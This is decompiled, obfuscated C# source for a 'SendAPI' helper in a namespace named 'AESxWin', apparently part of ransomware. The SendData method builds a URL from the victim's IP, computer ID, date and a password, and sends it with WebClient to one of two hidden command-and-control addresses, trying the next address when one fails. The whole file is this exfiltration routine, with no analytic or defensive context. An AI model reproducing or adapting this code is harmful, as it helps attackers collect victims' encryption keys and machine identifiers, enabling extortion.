using System;
using System.Net;
using System.Runtime.CompilerServices;
using A6yJVNZuoAn9NC1LAS;

namespace AESxWin.Helpers;

public static class SendAPI
{
	private static int CurrentIndex = 0;

	public static string[] Urls = new string[2]
	{
		S7EI44sMaZQ92MiG6X.pA2PN5iOW(2272),
		S7EI44sMaZQ92MiG6X.pA2PN5iOW(2276)
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string SendData(string ip, string computerId, DateTime date, string password)
	{
		//Discarded unreachable code: IL_0005, IL_008c, IL_0194
		//IL_0006: Incompatible stack heights: 0 vs 1
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		int num = (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092() ? 1 : 3);
		int num2 = num;
		string absoluteUri = default(string);
		Uri uri = default(Uri);
		string result = default(string);
		string empty = default(string);
		while (true)
		{
			switch (num2)
			{
			default:
				try
				{
					string text = date.ToString(S7EI44sMaZQ92MiG6X.pA2PN5iOW(2264));
					for (int i = 0; i < Urls.Length; i++)
					{
						if (string.IsNullOrEmpty(Urls[CurrentIndex]))
						{
							continue;
						}
						try
						{
							WebClient webClient = new WebClient();
							_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
							int num3;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								num3 = 3;
								if (1 == 0)
								{
									goto IL_007e;
								}
							}
							else
							{
								num3 = 1;
							}
							goto IL_0095;
							IL_007e:
							absoluteUri = uri.AbsoluteUri;
							goto IL_0110;
							IL_0110:
							webClient.DownloadString(absoluteUri);
							int num4 = 5;
							goto IL_0099;
							IL_0095:
							num4 = num3;
							goto IL_0099;
							IL_0099:
							switch (num4)
							{
							case 4:
								break;
							case 0:
							case 3:
								goto IL_00c6;
							default:
								goto IL_0110;
							case 5:
								CurrentIndex = 0;
								goto end_IL_0057;
							}
							goto IL_007e;
							IL_00c6:
							uri = new Uri(new Uri(Urls[CurrentIndex]), string.Format(S7EI44sMaZQ92MiG6X.pA2PN5iOW(2268), ip, computerId, text, password));
							num3 = 4;
							goto IL_0095;
							end_IL_0057:;
						}
						catch (Exception)
						{
							CurrentIndex++;
							continue;
						}
						break;
					}
				}
				catch
				{
				}
				result = empty;
				num2 = 5;
				break;
			case 0:
			case 1:
				empty = string.Empty;
				num2 = 4;
				break;
			case 4:
				CurrentIndex = 0;
				goto default;
			case 5:
				return result;
			}
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
